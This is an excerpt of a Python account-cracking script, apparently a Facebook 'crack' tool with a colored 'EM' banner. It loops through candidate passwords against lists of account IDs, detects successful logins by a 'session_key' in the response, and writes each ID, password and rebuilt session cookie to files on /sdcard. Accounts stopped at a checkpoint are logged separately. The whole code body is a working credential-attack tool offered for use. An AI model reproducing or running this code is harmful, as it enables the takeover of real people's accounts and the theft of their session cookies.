...
logo =f"""{A}
 ...
 \033[33;1mEEEEEEEEEEEEEEEEEEEEEEMMMMMMMM               MMMMMMMM
 \033[33;1mE::::::::::::::::::::EM:::::::M             M:::::::M
 \033[33;1mE::::::::::::::::::::EM::::::::M           M::::::::M
 \033[33;1mEE::::::EEEEEEEEE::::EM:::::::::M         M:::::::::M
   \033[33;1mE:::::E       EEEEEEM::::::::::M       M::::::::::M
  \033[33;1m E:::::E             M:::::::::::M     M:::::::::::M
   \033[33;1mE::::::EEEEEEEEEE   M:::::::M::::M   M::::M:::::::M
   \033[33;1mE:::::::::::::::E   M::::::M M::::M M::::M M::::::M
   \033[33;1mE:::::::::::::::E   M::::::M  M::::M::::M  M::::::M
   \033[33;1mE::::::EEEEEEEEEE   M::::::M   M:::::::M   M::::::M
   \033[33;1mE:::::E             M::::::M    M:::::M    M::::::M
   \033[33;1mE:::::E       EEEEEEM::::::M     MMMMM     M::::::M
 \033[33;1mEE::::::EEEEEEEE:::::EM::::::M               M::::::M
 \033[33;1mE::::::::::::::::::::EM::::::M               M::::::M
 \033[33;1mE::::::::::::::::::::EM::::::M               M::::::M
 \033[33;1mEEEEEEEEEEEEEEEEEEEEEEMMMMMMMM               MMMMMMMM"""
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/EM.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}EM-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[EM-OK] {sid} | {ps} ")
                    open('/sdcard/EM-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[EM-CP] {sid} | {ps} ")
                     open('/sdcard/EM-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}EM-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\r{G1}[EM-OK] {sid} | {ps} ")
                    open('/sdcard/EM-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[EM-CP] {sid} | {ps} ")
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}D-N-H-EMRUL{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
